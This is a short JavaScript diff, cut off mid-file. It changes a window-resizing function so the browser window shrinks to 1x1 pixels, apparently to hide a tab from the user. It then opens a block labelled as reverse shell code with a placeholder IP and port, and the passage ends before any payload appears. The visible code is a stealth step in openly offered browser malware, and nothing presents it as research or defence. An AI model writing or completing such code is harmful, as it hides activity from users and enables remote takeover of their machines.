@@ -1,19 +1,10 @@
 // Creating a tab that opens in reverse (1 by 1 pixels big)
-function resizeWindowByOnePixel() {
-    // Get the current window dimensions
-    const currentWidth = window.outerWidth;
-    const currentHeight = window.outerHeight;
-
-    // Increase the width and height by 1 pixel
-    const newWidth = currentWidth + 1;
-    const newHeight = currentHeight + 1;
-
-    // Resize the window
-    window.resizeTo(newWidth, newHeight);
+function resizeWindowToOnePixel() {
+    window.resizeTo(1, 1);
 }
 
 // Call the function to resize the window
-resizeWindowByOnePixel();
+resizeWindowToOnePixel();
 
 // Reverse shell code (replace the IP and port with your desired values)
 const reverseShellCode = `
